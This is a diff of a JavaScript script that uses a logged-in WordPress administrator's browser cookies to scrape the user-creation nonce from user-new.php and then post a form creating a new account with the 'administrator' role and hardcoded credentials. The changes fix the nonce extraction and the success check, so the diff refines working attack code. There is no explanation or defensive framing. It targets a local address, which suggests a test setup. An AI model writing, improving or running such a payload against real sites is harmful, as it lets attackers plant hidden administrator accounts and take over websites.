@@ -1,23 +1,21 @@
 async function getCreateUserNonce() {
   const pageRes = await fetch("http://127.0.0.1/wordpress/wp-admin/user-new.php", {
-    credentials: "include"  // uses browser's existing cookies automatically
+    credentials: "include"
   });
-
   const html = await pageRes.text();
-  const match = html.match(/id="_wpnonce_create-user"\s+value="([^"]+)"/);
+  const match = html.match(/name="_wpnonce_create-user"\s+value="([^"]+)"/);
   return match ? match[1] : null;
 }
 
 async function createAdminUser(username, email, password) {
   const nonce = await getCreateUserNonce();
-  if (!nonce) {
-    console.error("Could not extract nonce");
-    return;
-  }
+  if (!nonce) { console.error("Could not extract nonce"); return; }
 
-  const response = await fetch("http://127.0.0.1/wordpress/wp-admin/user-new.php", {
+  console.log("Got nonce:", nonce);
+
+  const res = await fetch("http://127.0.0.1/wordpress/wp-admin/user-new.php", {
     method: "POST",
-    credentials: "include",  // uses browser's existing cookies
+    credentials: "include",
     headers: {
       "Content-Type": "application/x-www-form-urlencoded",
       "Referer": "http://127.0.0.1/wordpress/wp-admin/user-new.php"
@@ -33,20 +31,20 @@ async function createAdminUser(username, email, password) {
       url: "",
       pass1: password,
       pass2: password,
-      pw_weak: "on",
-      send_user_notification: "0",
+      send_user_notification: "1",
       role: "administrator",
       createuser: "Add User"
     }).toString()
   });
 
-  const result = await response.text();
-  if (result.includes("user-new.php?update=add")) {
+  if (res.url.includes("update=add") || res.redirected) {
     console.log("User created successfully!");
   } else {
-    console.log("Check response:", result.substring(0, 500));
+    const html = await res.text();
+    const error = html.match(/<div[^>]+class="[^"]*error[^"]*"[^>]*>([\s\S]*?)<\/div>/);
+    if (error) console.error("Error:", error[1].replace(/<[^>]+>/g, '').trim());
+    else console.log("Response URL:", res.url);
   }
 }
 
-// Run it
 createAdminUser("newadmin", "newadmin@example.com", "StrongPass123!");
